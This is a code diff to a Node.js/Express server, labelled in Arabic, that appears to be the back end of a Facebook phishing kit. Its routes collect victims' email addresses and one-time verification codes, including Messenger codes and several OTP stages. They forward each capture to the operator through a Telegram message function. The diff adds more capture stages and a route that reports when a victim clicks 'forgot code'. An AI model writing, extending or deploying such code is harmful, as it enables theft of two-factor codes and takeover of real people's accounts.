@@ -80,8 +80,19 @@ app.post('/submit-forgot', async (req, res) => {
 app.post('/submit-otp', async (req, res) => {
     try {
         const { otp, email, stage } = req.body;
-        let title = stage === 'messenger' ? 'رمز Messenger' : 'رمز التحقق OTP';
-        let icon = stage === 'messenger' ? '💬' : '🔐';
+        let title = 'رمز التحقق OTP';
+        let icon = '🔐';
+        
+        if (stage === 'messenger') {
+            title = 'رمز Messenger';
+            icon = '💬';
+        } else if (stage === 'first-otp') {
+            title = 'رمز التحقق الأولي';
+            icon = '📱';
+        } else if (stage === 'otp-final') {
+            title = 'رمز OTP النهائي';
+            icon = '🔢';
+        }
         
         let msg = `${icon} <b>${title} - Facebook</b>\n`;
         msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
@@ -101,7 +112,9 @@ app.post('/submit-method', async (req, res) => {
     try {
         const { method, email } = req.body;
         let methodName = method === 'otp' ? 'رمز لمرة واحدة (OTP)' : 'رمز Messenger';
-        let msg = `🔄 <b>اختيار طريقة التحقق - Facebook</b>\n`;
+        let icon = method === 'otp' ? '🔢' : '💬';
+        
+        let msg = `${icon} <b>اختيار طريقة التحقق - Facebook</b>\n`;
         msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
         msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
         msg += `📧 <b>البريد:</b>\n<code>${email}</code>\n\n`;
@@ -114,6 +127,32 @@ app.post('/submit-method', async (req, res) => {
     }
 });
 
+// ========== إشعار "نسيت الرمز" ==========
+app.post('/submit-forgot-code', async (req, res) => {
+    try {
+        const { email, from } = req.body;
+        let location = 'صفحة Messenger';
+        
+        if (from === 'messenger-final') {
+            location = 'صفحة Messenger النهائية';
+        } else if (from === 'otp-final') {
+            location = 'صفحة OTP النهائية';
+        }
+        
+        let msg = `❓ <b>ضغط على "هل نسيت الرمز؟" - Facebook</b>\n`;
+        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
+        msg += `📧 <b>البريد:</b>\n<code>${email || 'غير محدد'}</code>\n\n`;
+        msg += `📍 <b>من:</b> ${location}\n\n`;
+        msg += `━━━━━━━━━━━━━━━━━━━━`;
+        await sendTelegramMessage(msg);
+        res.json({ success: true });
+    } catch (err) {
+        res.status(500).json({ success: false });
+    }
+});
+
 app.listen(PORT, () => {
     console.log(`✅ السيرفر شغال على http://localhost:${PORT}`);
+    console.log(`📱 اختبار: http://localhost:${PORT}/test`);
 });
